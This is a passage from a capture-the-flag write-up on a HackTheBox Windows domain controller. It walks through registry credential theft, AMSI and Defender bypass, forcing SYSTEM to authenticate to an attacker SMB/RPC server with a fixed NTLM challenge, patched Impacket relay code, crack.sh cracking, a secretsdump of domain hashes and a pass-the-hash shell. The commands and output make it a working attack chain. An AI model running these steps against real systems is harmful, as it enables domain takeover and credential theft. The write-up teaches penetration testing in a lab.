oxdf@parrot$ reg.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\SOFTWARE
HKU\SOFTWARE\GiganticHostingManagementSystem
HKU\SOFTWARE\Microsoft
HKU\SOFTWARE\Policies
HKU\SOFTWARE\RegisteredApplications
HKU\SOFTWARE\VMware, Inc.
HKU\SOFTWARE\Wow6432Node
HKU\SOFTWARE\Classes

oxdf@parrot$ reg.py -hashes aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb -dc-ip htb.local htb.local/henry.vinson@htb.local query -keyName HKU\\SOFTWARE\\GiganticHostingManagementSystem
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[!] Cannot check RemoteRegistry status. Hoping it is started...
HKU\SOFTWARE\GiganticHostingManagementSystem
        UserName        REG_SZ   henry.vinson_adm
        PassWord        REG_SZ   G1#Ny5@2dvht

```

### Shell

The “\_adm” in the username suggests this account will have admin level access of some kind, and it does at least have permissions to WinRM. I’ll get a shell with [Evil-WinRM](https://github.com/Hackplayers/evil-winrm):

```

oxdf@parrot$ evil-winrm -i htb.local -u henry.vinson_adm -p 'G1#Ny5@2dvht'

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents>

```

And grab `user.txt`:

```
*Evil-WinRM* PS C:\Users\henry.vinson_adm\desktop> cat user.txt
464d91e8************************

```

## Shell as Administrator

### Enumeration

#### PowerShell History

There’s not much on the host I can see as henry.vinson\_adm. The only users on the box are the two henry.vinson accounts and the administrator account.

There is a [PowerShell history file](/2018/11/08/powershell-history-file.html) in the henry.vinson\_adm account’s directory:

```
*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline> ls

    Directory: C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       11/10/2020  10:58 AM            458 ConsoleHost_history.txt
*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline> cat ConsoleHost_history.txt
$Cred = get-credential administrator
invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}

```

These commands are a hint. Interestingly, the timestamp on this file is 11 days after release, so this perhaps was a hint added after such a long initial blood time. The hint is to look at `lmcompatibilitylevel`. According to the [docs](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level), level of `2` means:

> Client devices use NTLMv1 authentication, and they use NTLMv2 session security if the server supports it. Domain controllers accept LM, NTLM, and NTLMv2 authentication.

NTLMv1 is insecure, and can be abused. I’ll verify it is set that way on APT:

```
*Evil-WinRM* PS C:\> Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel

lmcompatibilitylevel : 2
PSPath               : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa
PSParentPath         : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
PSChildName          : Lsa
PSDrive              : HKLM
PSProvider           : Microsoft.PowerShell.Core\Registry

```

#### WinPeas - Fail

If I’d missed the history file, I tried to find it with WinPeas. I uploaded the [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) exe and tried to run it, but Defender ate it:

```
*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\local\temp> upload /opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe
Info: Uploading /opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe to C:\Users\henry.vinson_adm\AppData\local\temp\winPEAS.exe

Data: 629416 bytes of 629416 bytes copied

Info: Upload successful!
*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\local\temp> ls

    Directory: C:\Users\henry.vinson_adm\AppData\local\temp

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/5/2021   6:10 PM         472064 winPEAS.exe
*Evil-WinRM* PS C:\Users\henry.vinson_adm\AppData\local\temp> .\winPEAS.exe
Program 'winPEAS.exe' failed to run: Operation did not complete successfully because the file contains a virus or potentially unwanted softwareAt line:1 char:1
+ .\winPEAS.exe
+ ~~~~~~~~~~~~~.
At line:1 char:1
+ .\winPEAS.exe
+ ~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

```

I was able to bypass this using some builtin features of [Evil-WinRM](https://github.com/Hackplayers/evil-winrm). First, I’ll run `menu` and then `Bypass-4MSI` to disable AMSI:

```
*Evil-WinRM* PS C:\Users\henry.vinson_adm\appdata\local\temp> menu

   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /    
        \/                               \/          \/       \/         \/      
              By: CyberVaca, OscarAkaElvis, Laox @Hackplayers

[+] Bypass-4MSI
[+] Dll-Loader 
[+] Donut-Loader 
[+] Invoke-Binary
*Evil-WinRM* PS C:\Users\henry.vinson_adm\appdata\local\temp> Bypass-4MSI
[+] Patched! :D

```

Now I can use `Invoke-Binary` to load an EXE from my system into memory:

```
*Evil-WinRM* PS C:\Users\henry.vinson_adm\appdata\local\temp> Invoke-Binary /opt/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/winPEAS/bin/x64/Release/winPEAS.exe
...[snip]...

```

This method of running does seem to cache all the output and then dump it once the process is complete, so it can take some patience to wait for output to come. WinPEAS didn’t identify the NTLM insecurity.

#### Seatbelt

[Seatbelt](https://github.com/GhostPack/Seatbelt#command-groups) is another enumeration script writing in C#. It has the same issues with AMSI/Defender as WinPEAS, and can be bypassed the same way.

```
*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> Invoke-Binary ./Seatbelt.exe -group=all
...[snip]...
====== NTLMSettings ======

  LanmanCompatibilityLevel    : 2(Send NTLM response only)

  NTLM Signing Settings
      ClientRequireSigning    : False
      ClientNegotiateSigning  : True
      ServerRequireSigning    : True
      ServerNegotiateSigning  : True
      LdapSigning             : 1 (Negotiate signing)

  Session Security
      NTLMMinClientSec        : 536870912 (Require128BitKey)
        [!] NTLM clients support NTLMv1!
      NTLMMinServerSec        : 536870912 (Require128BitKey)

        [!] NTLM services on this machine support NTLMv1!

  NTLM Auditing and Restrictions
      InboundRestrictions     : (Not defined)
      OutboundRestrictions    : (Not defined)
      InboundAuditing         : (Not defined)
      OutboundExceptions      :   
...[snip]...

```

### Strategy

The goal here is to capture a Net-NTLMv1 hash that I can send to crack.sh. Net-NTLM is a [challenge response protocol](https://en.wikipedia.org/wiki/NT_LAN_Manager#NTLMv1), where the client (APT) reached out to the server and says “I’m ABC”, the server (in this case Responder) says “If you are ABC, prove it on this random 8-bytes”. The client does a computation using it’s NTLM hash (derived from the password), and sends it back. Assuming the legit server has access to that hash, it can verify that client did too.

Net-NTLMv1 responses (often referred to as hashes, but not really a hash) use weak crypto. [crack.sh](https://crack.sh/netntlm/) has a service for cracking them using rainbow tables. Rainbow tables are just precomputed tables of tons of possible inputs mapped the the results. For example, someone can spend months calculating a given hash of all possible inputs, and then forever use these tables to map hashes back to inputs.

Typically a way to defeat rainbow tables is to have unique salts per hash. This makes all the passwords significantly more random, and reduces the effectiveness of rainbow tables. Something like a Net-NTLM won’t work with rainbow tables if you passively capture the exchange, because there’s a unique challenge generated by the server for each connection. What crack.sh has done is create rainbow tables for the specific challenge of “1122334455667788”. In a case like this, where the server is under malicious control, it can set that challenge to always be that specific value that was used for the rainbow table generation. This is all described on the crack.sh page.

I’ll need a method to get the System account to reach out to my server so that I can capture that hash. I’ll show two.
1. Task Defender to scan a file on a share on my host. I believe Microsoft has since disabled on demand scans of SMB shares, but it works on APT. This has the added benefits of working over SMB, so I can use responder to capture the hash, and it’s just an outbound IPv4 connection.
2. Using [Rogue Potato](https://github.com/antonioCoco/RoguePotato) to generate an RPC connection. I’ll need a custom RPC server to set the specific challenge and print the result. I’ll also have to modify RoguePotato to talk IPv6, as the RPC server will need to talk back to APT on 445, which isn’t listening on IPv4.

### Collect Net-NTLMv1 [Via SMB / Defender / Responder]

[This Technet page](https://docs.microsoft.com/en-us/windows/security/threat-protection/microsoft-defender-antivirus/command-line-arguments-microsoft-defender-antivirus) gives details on how to initiate a Defender scan of a specific file. `MpCmdRun` is in `%ProgramFiles\Windows Defender`. I’ll use these options:
- `-Scan` will initiate a scan
- `-ScanType 3` will do just a specific file, as opposed to a full (2) or quick scan (1)
- `-file \\10.10.14.9\share\does_exist.exe` will tell Defender to scan the file on my SMB share (which doesn’t have to exist, as Windows will authenticate before finding it’s not there).

Before I start [Responder](https://github.com/SpiderLabs/Responder), I’ll edit `/etc/responder/Responder.conf` to set the challenge to `1122334455667788`, the pattern that crack.sh has used in its rainbow tables. I’ll start `responder`, giving it the `--lm` flag to try to force a downgrade to Net-NTLMv1:

```

oxdf@parrot$ sudo responder -I tun0 --lm
...[snip]...

```

With Responder waiting, I’ll initiate the Defender scan:

```
*Evil-WinRM* PS C:\Program Files\windows defender> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.9\share\file.txt
Scan starting...
CmdTool: Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log for more information

```

At Responder, there’s a challenge response:

```

[+] Listening for events...                             
[SMB] NTLMv1 Client   : 10.10.10.213                  
[SMB] NTLMv1 Username : HTB\APT$                  
[SMB] NTLMv1 Hash     : APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788   

```

### Collect Net-NTLMv1 [Via RPC / RoguePotato]

This is the author’s intended solution. I’ll do my best to explain it here, but it’s not something I could have come up with on my own.

#### Update Rogue/Potato

RoguePotato won’t work to get execution as System because henry.vinson\_adm doesn’t have `SeImpersonatePrivilege`. Still, it will generate the RPC call and Net-NTLM auth as SYSTEM, which is what I’m trying to capture here. With the Impacket tools, RPC is a bit hard to work with and unstable, so it’s easier to accept the RPC connection, and use SMB to do the NTLM authentication. The challenge there is that SMB is not listening on IPv4, so I’ll need to update RoguePotato to work with an IPv6 address.

I’ll clone the [RoguePotato Git repo](https://github.com/antonioCoco/RoguePotato) into my Windows VM and open the project in Visual Studio. I’ll build the solution to make sure it builds before I edit it, and it does.

In `RoguePotato.cpp`, there’s a global variable, `remote_ip`:

![image-20210405151035633](https://0xdfimages.gitlab.io/img/image-20210405151035633.png)

It is set here based on the command line arguments. Searching in the “Solutions Explorer”, it’s used in another file, `IStorageTrigger.cpp`:

![image-20210405151153981](https://0xdfimages.gitlab.io/img/image-20210405151153981.png)

It’s converted here from a wide-character string to a multibyte string (`wcstombs`):

```

...[snip]...
HRESULT IStorageTrigger::MarshalInterface(IStream* pStm, const IID& riid, void* pv, DWORD dwDestContext, void* pvDestContext, DWORD mshlflags) {
	short sec_len = 8;
	char remote_ip_mb[16];
	wcstombs(remote_ip_mb, remote_ip, 16);
	char* ipaddr = remote_ip_mb;
	unsigned short str_bindlen = (unsigned short)((strlen(ipaddr)) * 2) + 6;
	unsigned short total_length = (str_bindlen + sec_len) / 2;
	unsigned char sec_offset = str_bindlen / 2;
...[snip]...

```

It will only read the first 16 bytes as is, which is enough to hold an IPv4 address as string (four groups of one to three digits + three periods and a newline or null). An IPv6 address is 16 bytes, but when represented as a string, will be eight groups of four characters plus `:` between each group, so up to 40 bytes. I’ll update those two lines:

```

	char remote_ip_mb[40];
	wcstombs(remote_ip_mb, remote_ip, 40);

```

Luckily for me, the rest of the code is built off the length of this, so it should work with no additional changes. I’ll build the solution and copy the new binary back to my Parrot VM.
*Note: IppSec mentioned he had some issue with RoguePotato being eaten by Defender on APT. I didn’t have to do any evasion, yet he did the same thing and did. It must come down to Visual Studio version, compiler settings, or other odd things like that. If you happen to have issues, his video would be a good place to watch for how he gets around it.*

#### RPC Server Strategy

Now that RoguePotato will initiate an RPC connection back to me, I want an RPC server that will send the specific challenge `1122334455667788` that will work with the rainbow tables at Crack.sh.

The idea is to start with `ntmlrelayx.py`, a script in the Impacket examples that is used to perform relay attacks. By default it has SMB, HTTP, and [recently added](https://clement.notin.org/blog/2020/11/16/ntlm-relay-of-adws-connections-with-impacket/) WCF / ADWS servers. The idea is that the attacker gets the victim somehow to connect to one of these servers, and then use that to gain authentication (over one of many potential protocols that authenticate with Net-NTLM) at a different server as the victim. [This post](https://www.secureauth.com/blog/playing-with-relayed-credentials/) does a good job explaining that in further detail, and has this really nice diagram:

![flavors of attack](https://0xdfimages.gitlab.io/img/flavors-of-attack.jpg)

[This patch](https://gist.github.com/Gilks/0fc75929faba704c05143b01f34c291b) will update an older Impact version to add an RPC server in `ntlmrelayx.py`. That server still wants to reach out to a target (step 2 above) and get a challenge (3) to send back to the victim for verification. I’ll want to modify it to not have a target, but just send the same challenge back (1122334455667788). In reality, this could all be done over RPC, but doing so with Impacket was unstable, so the code will switch to SMB to do the NTLM negotiation.

Even with people telling me the path and giving me code samples, this took a ton of debugging trial and error to get working. IppSec and I spent several hours on a call adding print statements and `pdb` breaks to try to get this working. I don’t have a good way to recreate all that troubleshooting in a blog post. But, if you’re working with Python code, the line `import pdb;pdb.set_trace()` is really a friend!

#### Create RPC Server

If I try to apply the patch to the most recent Impacket release, it will fail. The gist with the patch was released seven months ago, so the latest release at the point was [0.9.21](https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_21). This patch is actually expecting to be run against Impact [commit 3b0ff40c1a1755c55cf4ec881ddee9ffda4426a8](https://github.com/SecureAuthCorp/impacket/commit/3b0ff40c1a1755c55cf4ec881ddee9ffda4426a8), which is a few commits after that release (it took some trial and error to find that commit that accepted the patch). I’ll clone the repo, check out that commit:

```

oxdf@parrot$ git clone https://github.com/SecureAuthCorp/impacket.git
Cloning into 'impacket'...                                          
remote: Enumerating objects: 41, done.                                                                                                  
remote: Counting objects: 100% (41/41), done.
remote: Compressing objects: 100% (33/33), done.
remote: Total 18922 (delta 25), reused 20 (delta 8), pack-reused 18881
Receiving objects: 100% (18922/18922), 6.27 MiB | 10.70 MiB/s, done.
Resolving deltas: 100% (14401/14401), done.  
oxdf@parrot$ cd impacket  
oxdf@parrot$ git checkout 3b0ff40c1a1755c55cf4ec881ddee9ffda4426a8
HEAD is now at 3b0ff40c Added missing MSRPC_RTS cons

```

I’ll download and apply the patch:

```

oxdf@parrot$ wget https://gist.githubusercontent.com/Gilks/0fc75929faba704c05143b01f34c291b/raw/e1455b82d4a7ba23998151c28abc66f7e18a8e75/rpcrelayclientserver.patch
...[snip]...
oxdf@parrot$ git apply --whitespace=fix --reject rpcrelayclientserver.patch
...[snip]...
Applied patch examples/ntlmrelayx.py cleanly.
Applied patch impacket/dcerpc/v5/dcomrt.py cleanly.
Applied patch impacket/dcerpc/v5/rpcrt.py cleanly.
Applied patch impacket/examples/ntlmrelayx/attacks/rpcattack.py cleanly.
Applied patch impacket/examples/ntlmrelayx/clients/rpcrelayclient.py cleanly.
Applied patch impacket/examples/ntlmrelayx/servers/__init__.py cleanly.
Applied patch impacket/examples/ntlmrelayx/servers/rpcrelayserver.py cleanly.
Applied patch impacket/ntlm.py cleanly.
Applied patch tests/SMB_RPC/test_ldap.py cleanly.
Applied patch tests/SMB_RPC/test_rpcrt.py cleanly.
Applied patch tests/SMB_RPC/test_samr.py cleanly.
warning: squelched 3 whitespace errors
warning: 4 lines applied after fixing whitespace errors.

```

It’s important that all the patches are applied cleanly. If there are any rejections, something went wrong.

Next, I’ll update `impacket/examples/ntlmrelayx/servers/rpcrelayserver.py` . This file was added by the patch, and handles the RPC server. In the `setup` function of the `RPCHandler` class, it currently manages grabbing a target for the relay from a list of targets. I don’t need this, so I’ll modify that to not bother with it, but rather setting the target to SMB on the client address:

```

def setup(self):
    self.transport = DCERPCServer(self.request)
    IObjectExporterCallBacks = {
        5: self.send_ServerAlive2Response,
    }
    self.transport.addCallbacks(bin_to_uuidtup(IID_IObjectExporter), "135", IObjectExporterCallBacks)

    if self.server.config.target is None:
        # Reflection mode, defaults to SMB at the target, for now
        self.server.config.target = TargetsProcessor(singleTarget='SMB://%s:445/' % self.client_address[0])
        self.target = self.server.config.target.getTarget(None)
        LOG.info("RPCD: Received connection from %s" % (self.client_address[0]))

```

The `do_ntlm_negotiate` function currently managed the challenge response between the incoming client and the relay target. I’ll replace all of that with code that will use the known challenge. I’ll also disable ESS (Extended Session Security).

```

def do_ntlm_negotiate(self, token):
    self.target = self.server.config.target.getTarget(None)
    self.client = smbrelayclient.SMBRelayClient(self.server.config, self.target)
    if not self.client.initConnection():
        raise Exception("Failed to connect to SMB")
        self.challengeMessage = self.client.sendNegotiate(token)
        self.challengeMessage['challenge'] = bytes.fromhex('1122334455667788')
        data = bytearray(self.challengeMessage.getData())
        data[22] = data[22] & 0xf7 # 0xf7 == NTLMSSP_Disable_ESS
        self.challengeMessage = bytes(data)  

```

For some reason, I found that `self.target` was being unset to None between `setup` and this call, so I reset it at the top.

For that code to work, I’ll need to import `smbrelayclient` at the top of the file:

```

from impacket.examples.ntlmrelayx.clients import smbrelayclient

```

Next, the `negotiate_ntlm_session` function handles the negotiation. It starts with a bit `if` / `elif` statement based on the `messageType` coming in. The `NTLMSSP_AUTH_CHALLENGE_RESPONSE` message contains the challenge I want to capture to try to crack. In the relay scenario, it will take this hash and forward it on to try to get auth. I’ll replace all of that with two lines to print the result.

```

elif messageType == NTLMSSP_AUTH_CHALLENGE_RESPONSE:
    authenticateMessage = ntlm.NTLMAuthChallengeResponse()         
    authenticateMessage.fromString(token)                   
    ntlm_hash_data = outputToJohnFormat(bytes.fromhex('1122334455667788'), authenticateMessage['user_name'], authenticateMessage['domain_name'], authenticateMessage['lanman'], authenticateMessage['ntlm'])
    print(ntlm_hash_data['hash_string'], ntlm_hash_data['hash_version'])

else:                                    
    raise Exception("Unknown NTLMSSP MessageType %d" % messageType)

```

Running like this will cause a crash in the `smbrelayclient` because it is not ready to handle IPv6 addresses. In `impacket/examples/ntlmrelayx/clients/__init__.py`, with `pdb` I was able to debug this code:

```

class ProtocolClient:
    PLUGIN_NAME = 'PROTOCOL'
    def __init__(self, serverConfig, target, targetPort, extendedSecurity=True):
        self.serverConfig = serverConfig
        self.targetHost = target.hostname
        # A default target port is specified by the subclass
        if target.port is not None:
            # We override it by the one specified in the target
            self.targetPort = target.port
        else:
            self.targetPort = targetPort
        self.target = target
        self.extendedSecurity = extendedSecurity
        self.session = None
        self.sessionData = {}

```

`target.hostname` was `dead`, which is the first quad of the IPv6 address. It seems it’s splitting the hostname on `:`, expecting the format `host:port`. `target.netloc` will give the full uri for the target (`'dead:beef::b885:d62a:d679:573f:445'`), so I can use that to do the initialization required in this function. I’ll check for more than 2 colons on the `netloc`, which will be in IPv6 but not IPv4.

```

class ProtocolClient:
    PLUGIN_NAME = 'PROTOCOL'
    def __init__(self, serverConfig, target, targetPort, extendedSecurity=True):
        self.serverConfig = serverConfig
        if target.netloc.count(":") > 2:
            self.targetHost = ":".join(self.netloc.split(":")[:-1])
            self.target = self.targetHost
            self.targetPort = targetPort
        else:
            self.targetHost = target.hostname
            # A default target port is specified by the subclass
            if target.port is not None:
                # We override it by the one specified in the target
                self.targetPort = target.port
            else:
                self.targetPort = targetPort
            self.target = target
        self.extendedSecurity = extendedSecurity
        self.session = None
        self.sessionData = {} 

```

I’ll need a main file to create and manage the server:

```

#!/usr/bin/python3
import sys
import logging
from impacket.examples.ntlmrelayx.servers.rpcrelayserver import RPCRelayServer
from impacket.examples import logger
from impacket.examples.ntlmrelayx.utils.config import NTLMRelayxConfig
from impacket.examples.ntlmrelayx.utils.targetsutils import TargetsProcessor

logger.init(True)
logging.getLogger().setLevel(logging.DEBUG)

c = NTLMRelayxConfig()
c.setEncoding(sys.getdefaultencoding())
c.setSMB2Support(True)
c.setListeningPort(135)
c.setInterfaceIp('')
c.setIPv6(True)

s = RPCRelayServer(c)
s.run()

```

I’ll run create a virtual env to run all this in and install the needed packages:

```

oxdf@parrot$ python3 -m venv venv
oxdf@parrot$ source venv/bin/activate
(venv) oxdf@parrot$ pip install -r requirements.txt
...[snip]...

```

#### Capture Challenge

I’ll run the server:

```

(venv) oxdf@parrot$ python rpcsrv.py 
[2021-04-07 10:28:10] [*] Setting up RPC Server

```

From APT, I’ll upload my modified RoguePotato binary and run it. It hangs for a minute, and prints failure. That’s ok, because I wasn’t expecting RoguePotato to work. Back at the RPC server:

```

(venv) oxdf@parrot$ python rpcsrv.py 
[2021-04-07 10:28:10] [*] Setting up RPC Server
[2021-04-07 10:28:35] [*] Callback added for UUID 99FCFEC4-5260-101B-BBCB-00AA0021347A V:0.0
[2021-04-07 10:28:35] [*] RPCD: Received connection from dead:beef::b885:d62a:d679:573f
[2021-04-07 10:28:35] [+] RPC: Received packet of type MSRPC BIND
[2021-04-07 10:28:35] [+] Answering to a BIND without authentication
[2021-04-07 10:28:35] [+] RPC: Sending packet of type MSRPC BINDACK
[2021-04-07 10:28:35] [+] RPC: Received packet of type MSRPC REQUEST
[2021-04-07 10:28:35] [+] RPC: Sending packet of type MSRPC RESPONSE
[2021-04-07 10:28:35] [*] Callback added for UUID 99FCFEC4-5260-101B-BBCB-00AA0021347A V:0.0
[2021-04-07 10:28:35] [*] RPCD: Received connection from dead:beef::b885:d62a:d679:573f
[2021-04-07 10:28:35] [+] RPC: Received packet of type MSRPC BIND
[2021-04-07 10:28:35] [-] Signing is required, attack won't work unless using -remove-target / --remove-mic
[2021-04-07 10:28:35] [+] RPC: Sending packet of type MSRPC BINDACK
[2021-04-07 10:28:35] [+] RPC: Received packet of type MSRPC AUTH3
APT$::HTB:95aca8c7248774cb427e1ae5b8d5ce6830a49b5bb858d384:95aca8c7248774cb427e1ae5b8d5ce6830a49b5bb858d384:1122334455667788 ntlm
[2021-04-07 10:28:35] [+] RPC: Received packet of type MSRPC REQUEST
[2021-04-07 10:28:35] [-] Unsupported DCERPC opnum 4 called for interface ('99FCFEC4-5260-101B-BBCB-00AA0021347A', '0.0')
[2021-04-07 10:28:35] [+] RPC: Sending packet of type MSRPC FAULT
[2021-04-07 10:28:35] [+] RPC: Connection closed by client
[2021-04-07 10:28:46] [-] Connection reset.

```

In the middle is the Net-NTLMv1 hash:

```

APT$::HTB:95aca8c7248774cb427e1ae5b8d5ce6830a49b5bb858d384:95aca8c7248774cb427e1ae5b8d5ce6830a49b5bb858d384:1122334455667788

```

### Crack Hash

Either of the above methods produce a Net-NTLMv1 hash, which I can now take to the [crack.sh submission page](https://crack.sh/get-cracking/), and put it in (it qualifies for free):

![image-20210405142435856](https://0xdfimages.gitlab.io/img/image-20210405142435856.png)

The hash came back minutes later:

![image-20210405142521066](https://0xdfimages.gitlab.io/img/image-20210405142521066.png)

### Dump Hashes

Now I have the NTLM hash for the machine account of this domain controller. That can be used with `secretsdump.py` to dump the hashes for the rest of the AD:

```

oxdf@parrot$ secretsdump.py -hashes :d167c3238864b12f5f82feae86a7f798 'htb.local/APT$@htb.local'
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c370bddf384a691d811ff3495e8a72e2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:738f00ed06dc528fd7ebb7a010e50849:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
henry.vinson:1105:aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb:::
henry.vinson_adm:1106:aad3b435b51404eeaad3b435b51404ee:4cd0db9103ee1cf87834760a34856fef:::
APT$:1001:aad3b435b51404eeaad3b435b51404ee:d167c3238864b12f5f82feae86a7f798:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:72f9fc8f3cd23768be8d37876d459ef09ab591a729924898e5d9b3c14db057e3
Administrator:aes128-cts-hmac-sha1-96:a3b0c1332eee9a89a2aada1bf8fd9413
Administrator:des-cbc-md5:0816d9d052239b8a
krbtgt:aes256-cts-hmac-sha1-96:b63635342a6d3dce76fcbca203f92da46be6cdd99c67eb233d0aaaaaa40914bb
krbtgt:aes128-cts-hmac-sha1-96:7735d98abc187848119416e08936799b
krbtgt:des-cbc-md5:f8c26238c2d976bf
henry.vinson:aes256-cts-hmac-sha1-96:63b23a7fd3df2f0add1e62ef85ea4c6c8dc79bb8d6a430ab3a1ef6994d1a99e2
henry.vinson:aes128-cts-hmac-sha1-96:0a55e9f5b1f7f28aef9b7792124af9af
henry.vinson:des-cbc-md5:73b6f71cae264fad
henry.vinson_adm:aes256-cts-hmac-sha1-96:f2299c6484e5af8e8c81777eaece865d54a499a2446ba2792c1089407425c3f4
henry.vinson_adm:aes128-cts-hmac-sha1-96:3d70c66c8a8635bdf70edf2f6062165b
henry.vinson_adm:des-cbc-md5:5df8682c8c07a179
APT$:aes256-cts-hmac-sha1-96:4c318c89595e1e3f2c608f3df56a091ecedc220be7b263f7269c412325930454
APT$:aes128-cts-hmac-sha1-96:bf1c1795c63ab278384f2ee1169872d9
APT$:des-cbc-md5:76c45245f104a4bf
[*] Cleaning up... 

```

### Shell

The administrator hash is enough to get a shell:

```

oxdf@parrot$ evil-winrm -u administrator -H c370bddf384a691d811ff3495e8a72e2 -i apt.htb

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>

```

And get the root flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
d93e6432************************

```